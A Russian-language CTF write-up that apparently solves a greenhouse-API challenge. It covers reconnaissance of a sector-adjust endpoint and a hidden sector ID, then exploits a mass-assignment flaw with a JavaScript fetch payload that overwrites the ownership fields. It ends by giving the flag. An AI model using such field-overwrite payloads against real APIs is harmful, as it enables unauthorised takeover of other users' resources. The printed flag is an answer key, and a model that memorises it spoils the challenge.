


**Шаг 1: Разведка и поиск цели**
При анализе API системы управления теплицами был найден эндпоинт для настройки климата: `POST /api/sector/{id}/adjust`. Попытки перебора ранних ID (1-30) давали ошибки 404 на проверке статуса. В ходе глубокой разведки и чтения конфигураций был обнаружен скрытый сектор капибар с ID **6454**.

**Шаг 2: Обнаружение защиты**
Даже отправляя правильные параметры температуры и влажности с использованием админского `X-API-Key` и куки сессии, сервер не засчитывал прогресс квеста. Анализ структуры JSON показал наличие полей `is_own: false` и `is_capyagro: false`. Сервер игнорировал настройку, так как сектор технически не принадлежал пользователю.

**Шаг 3: Эксплуатация (Mass Assignment)**
Бекенд принимал JSON-payload и обновлял запись в базе без фильтрации полей. Чтобы захватить сектор и выполнить условия, мы сформировали кастомный запрос к `6454`-му сектору, передав нужные параметры климата (22.0°C / 70%) и принудительно перезаписав права собственности и тип сектора.

**Пейлоад (JS Fetch):**
```javascript
fetch('/api/sector/6454/adjust', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-API-Key': 'test_key_123'
    },
    credentials: 'include',
    body: JSON.stringify({ 
        temp: 22.0,         
        humidity: 70.0,     
        is_own: true,       // Уязвимость Mass Assignment (забираем сектор)
        is_capyagro: true   // Подтверждаем целевой сектор
    })
});
```

**Результат:** Сервер проглотил подмену полей, засчитал идеальные условия в нашем секторе и выдал флаг.

 **Флаг:** `KubSTU(Sav3d_th3_CapyArg0S3ct0r)`
